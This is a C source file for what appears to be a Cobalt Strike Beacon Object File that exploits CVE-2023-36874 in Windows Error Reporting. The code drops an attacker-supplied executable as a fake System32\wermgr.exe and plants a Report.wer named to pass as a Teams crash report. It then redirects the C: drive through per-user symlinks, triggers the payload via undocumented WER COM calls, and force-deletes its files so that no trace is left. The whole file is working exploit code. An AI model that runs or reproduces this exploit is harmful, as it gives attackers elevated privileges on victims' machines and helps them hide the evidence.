#include "def.h"

//------------- Options ------------- 
//reportDirStub: This is the directory that will be created in c:\programdata\microsoft\windows\wer\reportarchive to hold Report.wer. 
//               A random GUID will be generated and appended to the end to comply with the usual format for OPSEC purposes, as well as to reduce the likelihood of a directory conflict. 

WCHAR reportDirStub[] = L"AppCrash_MicrosoftTeams_2_bfdce674bdd89fc26abb5435af278fe5356c4_fd556e9d_";
//WCHAR reportDirStub[] = L"AppCrash_EXCEL.EXE_9e3ac93afab851f696b4b71a44eb3b4884a92e92_30af6335_";

extern "C" {
	#include "beacon.h"
	void go(IN PCHAR Buffer, IN ULONG Length);
    void ___chkstk_ms() { /* needed to resolve linker errors for bof_extract */ }

    //------------- BOF API Definitions -------------

    //KERNEL32
    WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryW(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
    WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
    WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
    WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
    WINBASEAPI VOID WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
    WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
    WINBASEAPI DWORD WINAPI Kernel32$GetCurrentDirectoryW(DWORD nBufferLength, LPWSTR lpBuffer);
    WINBASEAPI BOOL WINAPI KERNEL32$SetFileInformationByHandle (HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);
    WINBASEAPI BOOL WINAPI KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);
    WINBASEAPI BOOL WINAPI KERNEL32$RemoveDirectoryW(LPCWSTR lpPathName);
    WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR lpFileName);

    #define CreateDirectoryW            KERNEL32$CreateDirectoryW
    #define CreateFileW                 KERNEL32$CreateFileW
    #define WriteFile                   KERNEL32$WriteFile
    #define CloseHandle                 KERNEL32$CloseHandle
    #define Sleep                       KERNEL32$Sleep
    #define GetLastError                KERNEL32$GetLastError
    #define GetCurrentDirectoryW        Kernel32$GetCurrentDirectoryW
    #define SetFileInformationByHandle  KERNEL32$SetFileInformationByHandle
    #define GetFileAttributesW          KERNEL32$GetFileAttributesW
    #define RemoveDirectoryW            KERNEL32$RemoveDirectoryW
    #define DeleteFileW                 KERNEL32$DeleteFileW

    //MSVCRT
    WINBASEAPI void __cdecl MSVCRT$srand(unsigned int seed);
    WINBASEAPI int __cdecl MSVCRT$rand(void);
    WINBASEAPI int __cdecl MSVCRT$swprintf_s(wchar_t *buffer, size_t sizeOfBuffer, const wchar_t *format, ...);
    WINBASEAPI time_t __cdecl MSVCRT$time(time_t *desttime);
    WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *str);
    WINBASEAPI errno_t __cdecl MSVCRT$wcscat_s(wchar_t *strDestination, size_t numberOfElements, const wchar_t *strSource);
    WINBASEAPI  void*   __cdecl MSVCRT$calloc(size_t number, size_t size);
    WINBASEAPI  void    __cdecl MSVCRT$free(void *_Memory);
    WINBASEAPI  void*   __cdecl MSVCRT$memcpy(void * _Dst, const void * _Src, size_t _Size);
    WINBASEAPI  void*   __cdecl MSVCRT$memset (void* _Dst, int _Val, size_t Size);

    #define srand                       MSVCRT$srand
    #define rand                        MSVCRT$rand
    #define swprintf_s                  MSVCRT$swprintf_s
    #define time                        MSVCRT$time
    #define wcslen                      MSVCRT$wcslen
    #define wcscat_s                    MSVCRT$wcscat_s
    #define memcpy                      MSVCRT$memcpy
    #define calloc                      MSVCRT$calloc
    #define free                        MSVCRT$free
    #define memset                      MSVCRT$memset

    //OLE32
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitialize(LPVOID pvReserved);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE *asAuthSvc, void *pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void *pAuthList, DWORD dwCapabilities, void *pReserved3);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoUninitialize(void);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CLSIDFromString (LPCOLESTR lpsz, LPCLSID pclsid);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$IIDFromString(LPCOLESTR lpsz, LPIID lpiid);

    #define CoInitialize                OLE32$CoInitialize
    #define CoInitializeSecurity        OLE32$CoInitializeSecurity
    #define CoCreateInstance            OLE32$CoCreateInstance
    #define CoUninitialize              OLE32$CoUninitialize
    #define CLSIDFromString             OLE32$CLSIDFromString
    #define IIDFromString               OLE32$IIDFromString

    //OLEAUT32
    WINBASEAPI BSTR WINAPI OLEAUT32$SysAllocString(const OLECHAR *psz);
    WINBASEAPI void WINAPI OLEAUT32$SysFreeString(BSTR bstrString);

    #define SysAllocString              OLEAUT32$SysAllocString
    #define SysFreeString               OLEAUT32$SysFreeString

    //NTDLL
    NTSYSAPI VOID NTAPI NTDLL$RtlInitUnicodeString(PUNICODE_STRING DestinationString, PWSTR SourceString);
    NTSYSAPI NTSTATUS NTAPI NTDLL$NtCreateDirectoryObject(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
    NTSYSAPI NTSTATUS NTAPI  NTDLL$NtCreateSymbolicLinkObject(PHANDLE LinkHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING LinkTarget);

    #define RtlInitUnicodeString        NTDLL$RtlInitUnicodeString
    #define NtCreateDirectoryObject     NTDLL$NtCreateDirectoryObject
    #define NtCreateSymbolicLinkObject  NTDLL$NtCreateSymbolicLinkObject
}

//Generate random string or GUID
void rand_string(wchar_t str[], size_t size, BOOL guid)
{
    wchar_t charset1[] = L"0123456789abcdef13579ace24";
    wchar_t charset2[] = L"abcdefghijklmnopqrstuvwxyz";
    wchar_t* charset;
    if (guid)
        charset = charset1;
    else
        charset = charset2;

    if (size) {
        --size;
        for (size_t n = 0; n < size; n++) {
            if(guid && (n == 8 || n == 13 || n == 18 || n == 23))
                *str = L'-';
            else
            {
                int key = rand() % (int)(25);
                *str = charset[key];
            }
            str++;
        }
        *str = '\0';
    }
    return;
}

//------------- Force-deletion related functions -------------
BOOL renameDataStream(HANDLE hHandle) 
{
    WCHAR wStream[12] = {0};
    WCHAR wRandstr[11] = {0};

    //Generate random string for our ADS
    rand_string(wRandstr, 11, FALSE);
    swprintf_s(wStream, 12, L":%ls", wRandstr);

    DWORD dwADSLen = wcslen(wStream) * sizeof(wchar_t);

    FILE_RENAME_INFO *friRename = (FILE_RENAME_INFO*)calloc(sizeof(FILE_RENAME_INFO) + dwADSLen, sizeof(char));

    friRename->FileNameLength = dwADSLen;
    memcpy(friRename->FileName, wStream, dwADSLen);

    BOOL bResult = SetFileInformationByHandle(hHandle, FileRenameInfo, friRename, sizeof(FILE_RENAME_INFO) + dwADSLen);

    free(friRename);

    return bResult;
}

BOOL setDeletionAttribute(HANDLE hHandle) 
{
    FILE_DISPOSITION_INFO fDelete;
    memset(&fDelete, 0, sizeof(fDelete));

    fDelete.DeleteFile = TRUE;

    return SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDelete, sizeof(fDelete));
}

BOOL FileExists(LPCWSTR szPath)
{
    DWORD dwAttrib = GetFileAttributesW(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL forceDelete(WCHAR exePath[])
{
    HANDLE hCurrent = CreateFileW(exePath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if ( hCurrent == INVALID_HANDLE_VALUE ) {
        BeaconPrintf(CALLBACK_ERROR, "forceDelete: Failed to get handle to EXE.\n");
        return FALSE;
    }

    BOOL returnedHandleRename = renameDataStream(hCurrent);
    CloseHandle(hCurrent);
    if ( !returnedHandleRename ) {
        BeaconPrintf(CALLBACK_ERROR, "forceDelete: Failed to rename data stream from handle.\n");
        return FALSE;
    }

    hCurrent = CreateFileW(exePath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if ( hCurrent == INVALID_HANDLE_VALUE ) {
        BeaconPrintf(CALLBACK_ERROR, "forceDelete: Failed to get second handle to EXE.\n");
        return FALSE;
    }
    
    BOOL setAttr = setDeletionAttribute(hCurrent);
    CloseHandle(hCurrent);
    if ( !setAttr ) {
        BeaconPrintf(CALLBACK_ERROR, "forceDelete: Failed to set desired deposition.\n");
        return FALSE;
    } 

    if(FileExists(exePath))
    {
        BeaconPrintf(CALLBACK_ERROR, "forceDelete: Function completed but EXE still exists on target!\n");
        return FALSE;
    }

    return TRUE;
}

//------------- End force-deletion related functions -------------

void go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    
    int exeLen, reportLen;

    //Extract beacon args
    char* reportBytes = BeaconDataExtract(&parser, &reportLen);
    char* exeBytes = BeaconDataExtract(&parser, &exeLen);
    wchar_t* argDir = (wchar_t*)BeaconDataExtract(&parser, NULL);

    IWerReport* pIWerReport = NULL;
    IErcLuaSupport* pIErcLuaSupport = NULL;
    IWerStoreFactory* pIWerStoreFactory = NULL;
    IWerStore* pIWerStore = NULL;
    IWerReportSubmitCallback* pIWerSubmitCallback = NULL;
    HRESULT result = 0;
    UNICODE_STRING symlink_name;
    UNICODE_STRING path;
    UNICODE_STRING object;
    OBJECT_ATTRIBUTES objAttrLink, objAttrDir;
    HANDLE hSymlink, hObjectdir, hSymlinkWindows, hSymlinkProgramdata;
    CLSID CLSID_IErcLuaSupport;
    IID IID_IErcLuaSupport;
    int64_t ret = 0;
    BSTR report;
    BSTR data;

    WCHAR randGUID[37] = {0};
    WCHAR randDir[10] = {0};
    WCHAR randData[10] = {0};
    WCHAR reportDir[255] = {0};
    WCHAR absoluteReportDir[255] = {0};
    WCHAR reportPath[255] = {0};
    WCHAR ntdcoDir[25] = {0};
    WCHAR redirectPath[255] = {0};
    WCHAR newSys32Dir[255] = {0};
    WCHAR exePath[255] = {0};
    WCHAR writableDir[255] = {0};
    BOOL comInitialized = FALSE;
    BOOL bExeCreated = FALSE;
    BOOL bSys32DirCreated = FALSE;
    BOOL bReportCreated = FALSE;
    BOOL bReportDirCreated = FALSE;
    BOOL bDeleted = FALSE;

    //Seed rand
    srand(time(0));

    //Initialize our GUIDs
    //MingW / BOF's did not like the __uuidof macro, so using (IID|CLSID)FromString 
    const wchar_t* strCLSID_IErcLuaSupport = L"{0e9a7bb5-f699-4d66-8a47-b919f5b6a1db}";
    const wchar_t* strIID_IErcLuaSupport = L"{6620c14b-70ae-4d4e-a4f6-91a7dcc582c2}";
    CLSIDFromString(strCLSID_IErcLuaSupport, (LPCLSID)&CLSID_IErcLuaSupport);
    IIDFromString(strIID_IErcLuaSupport, (LPIID)&IID_IErcLuaSupport);

    //If no string was sent for the writable folder, we are going to try and write to the current working directory
    if(wcslen(argDir) == 0)
    {
        if(GetCurrentDirectoryW(MAX_PATH, writableDir) == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve current directory\n");
            return;
        }
    }
    //Otherwise just copy writable location string into hijacklocation
    else
        swprintf_s(writableDir, MAX_PATH, argDir);

    //Assemble our redirectPath for use later with NT calls and add a trailing backslash to writableDir because we will be appending things.
    swprintf_s(redirectPath, MAX_PATH, L"\\GLOBAL??\\%ls", writableDir);   
    wcscat_s(writableDir, MAX_PATH, L"\\");

    //First thing, make sure we can create System32 directory at the user-specified location
    swprintf_s(newSys32Dir, 255, L"%lsSystem32", writableDir);
    if(!CreateDirectoryW(newSys32Dir, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "User does not have write permissions in %ls!\n", writableDir);
        return;
    }
    else
        bSys32DirCreated = TRUE;

    //Next drop our mal exe to disk
    swprintf_s(exePath, 255, L"%ls\\wermgr.exe", newSys32Dir);
    HANDLE hFile = CreateFileW(exePath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create %ls. GLE: %d\n", exePath, GetLastError());
        goto cleanup;
    }
    else
        bExeCreated = TRUE;
    if (!WriteFile(hFile, exeBytes, exeLen, NULL, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write wermgr.exe to disk. GLE: %d\n", GetLastError());
        CloseHandle(hFile);
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, " [+] created %ls\n", exePath);
    CloseHandle(hFile);

    //Generate random GUID and create new directory to hold our Report.wer file
    rand_string(randGUID, 37, TRUE);
    swprintf_s(reportDir, 255, L"%ls%ls", reportDirStub, randGUID);
    swprintf_s(absoluteReportDir, 255, L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\%ls", reportDir);

    if(!CreateDirectoryW(absoluteReportDir, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create %ls directory. GLE: %d\n", reportDir, GetLastError());
        goto cleanup;
    }
    else
        bReportDirCreated = TRUE;

    //Create our Report.wer and write byte array to file
    swprintf_s(reportPath, 255, L"%ls\\Report.wer", absoluteReportDir);
    hFile = CreateFileW(reportPath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create %ls. GLE: %d\n", reportPath, GetLastError());
        goto cleanup;
    }
    else
        bReportCreated = TRUE;
    if (!WriteFile(hFile, reportBytes, reportLen, NULL, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write to report.wer file. GLE: %d\n", GetLastError());
        CloseHandle(hFile);
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, " [+] created %ls\n", reportPath);
    CloseHandle(hFile);

    //Initialize COM
    result = CoInitialize(NULL);
    if (FAILED(result))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error: CoInitialize 0x%x\n", result);
        return;
    }
    else
        comInitialized = TRUE;

    //Note that EOAC_DYNAMIC_CLOAKING was specified, breaking from the original POC in order to preserve the ability for impersonation with COM/WMI calls later in the Beacon using other tools.
    //See https://github.com/CCob/BOF.NET/issues/3 for more details
    result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
    if (FAILED(result))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error: CoInitializeSecurity 0x%x\n", result);
        goto cleanup;
    }

    //Begin our COM calls to submit our Report.wer
    result = CoCreateInstance(CLSID_IErcLuaSupport, NULL, CLSCTX_LOCAL_SERVER, IID_IErcLuaSupport, (PVOID*)&pIErcLuaSupport);
    if (FAILED(result))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error CoCreateInstance: 0x%x\n", result);
        goto cleanup;
    }
    
    result = pIErcLuaSupport->Proc3(&pIWerStoreFactory);
    if (FAILED(result))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error pIErcLuaSupport: 0x%x\n", result);
        goto cleanup;
    }
   
    result = pIWerStoreFactory->Proc4(&pIWerStore);
    if (FAILED(result))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error pIWerStoreFactory: 0x%x\n", result);
        goto cleanup;
    }
    
    result = pIWerStore->Proc3();
    if (FAILED(result))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error pIWerStore(Proc3) : 0x%x\n", result);
        goto cleanup;
    }
    
    rand_string(randData, 10, FALSE);

    report = SysAllocString(reportDir);
    data = SysAllocString(randData);

    result = pIWerStore->Proc6(report,&pIWerReport);
    if (FAILED(result))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error pIWerStore(Proc6): 0x%x\n", result);
        goto cleanup;
    }

    //Create all of our "symlinks" - Note these are user-specific redirections, not true symlinks that are globally available to all users on the machine.
    
    //Generate random dir name for use with NtCreateDirectoryObject seeing as this value is arbitrary.
    rand_string(randDir, 10, FALSE);
    swprintf_s(ntdcoDir, 25, L"\\??\\%ls", randDir);
    RtlInitUnicodeString(&object, ntdcoDir);
    InitializeObjectAttributes(&objAttrDir, &object, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NtCreateDirectoryObject(&hObjectdir, 0xF000F, &objAttrDir);
    
    RtlInitUnicodeString(&symlink_name, L"Windows");
    RtlInitUnicodeString(&path, redirectPath);
    InitializeObjectAttributes(&objAttrLink, &symlink_name, OBJ_CASE_INSENSITIVE, hObjectdir, NULL);
    NtCreateSymbolicLinkObject(&hSymlinkWindows, 0xF0001, &objAttrLink, &path);

    ZeroMemory(&objAttrLink, sizeof(objAttrLink));
    ZeroMemory(&symlink_name, sizeof(symlink_name));
    ZeroMemory(&path, sizeof(UNICODE_STRING));

    RtlInitUnicodeString(&symlink_name, L"ProgramData");
    RtlInitUnicodeString(&path, L"\\GLOBAL??\\C:\\Programdata");
    InitializeObjectAttributes(&objAttrLink, &symlink_name, OBJ_CASE_INSENSITIVE, hObjectdir, NULL);
    NtCreateSymbolicLinkObject(&hSymlinkProgramdata, 0xF0001, &objAttrLink, &path);

    ZeroMemory(&objAttrLink, sizeof(objAttrLink));
    ZeroMemory(&symlink_name, sizeof(symlink_name));
    ZeroMemory(&path, sizeof(UNICODE_STRING));

    RtlInitUnicodeString(&symlink_name, L"\\??\\C:");
    RtlInitUnicodeString(&path, ntdcoDir);
    InitializeObjectAttributes(&objAttrLink, &symlink_name, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NtCreateSymbolicLinkObject(&hSymlink, 0xF0001, &objAttrLink, &path);

    //Make final COM call
    result = pIWerReport->Proc24(report, 1024, NULL, &data, &ret);
    if (FAILED(result))
    {
        if(result == 0x80004001)
           BeaconPrintf(CALLBACK_ERROR, "Target is not vulnerable to CVE-2023-36874!\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "Error pIWerReport: 0x%x\n", result);
        goto cleanup;
    }
    else
        BeaconPrintf(CALLBACK_OUTPUT, "\n [+] Exploit successful!\n");
    Sleep(2000);

cleanup:
    BeaconPrintf(CALLBACK_OUTPUT, "\n Cleaning up...\n");
    //Close handles
    if(hSymlink)
        CloseHandle(hSymlink);
    if(hObjectdir)
        CloseHandle(hObjectdir);
    if(hSymlinkProgramdata)
        CloseHandle(hSymlinkProgramdata);
    if(hSymlinkWindows)
        CloseHandle(hSymlinkWindows);

    //Free Memory
    if(report)
        SysFreeString(report);
    if(data)
        SysFreeString(data);

    //Shut down COM
    if(comInitialized)
        CoUninitialize();

    //Delete Report.wer
    if(bReportCreated)
    {
        bDeleted = DeleteFileW(reportPath);
        if(bDeleted)
            BeaconPrintf(CALLBACK_OUTPUT, " [+] Report.wer deleted!\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "Failed to delete %ls!\n", reportPath);
    }

    //Delete created Report directory if:
    //1. The report was dropped to disk (which happens after dir creation) AND deleted, so the dir is empty. OR
    //2. The report was not dropped  to disk, but the new report dir was created.
    if((bReportCreated && bDeleted) || (!bReportCreated && bReportDirCreated))
    {
        bDeleted = RemoveDirectoryW(absoluteReportDir);
        if(bDeleted)
            BeaconPrintf(CALLBACK_OUTPUT, " [+] Report directory deleted!\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "Failed to delete %ls!\n", absoluteReportDir);
    }

    //Delete payload from disk
    if(bExeCreated)
    {
        BOOL bDeleted = forceDelete(exePath);
        if(bDeleted)
            BeaconPrintf(CALLBACK_OUTPUT, " [+] EXE deleted!\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "Failed to delete %ls! Migrate and then manually remove EXE and the created directory!\n", exePath);
    }

    //Delete created System32 directory if:
    //1. The exe was dropped to disk (which happens after dir creation) AND deleted, so the dir is empty. OR
    //2. The exe was not dropped  to disk, but the new sys32 dir was created.
    if((bExeCreated && bDeleted) || (!bExeCreated && bSys32DirCreated))
    {
        bDeleted = RemoveDirectoryW(newSys32Dir);
        if(bDeleted)
            BeaconPrintf(CALLBACK_OUTPUT, " [+] Phony System32 directory deleted!\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "Failed to delete %ls!\n", newSys32Dir);
    }

    return;
}
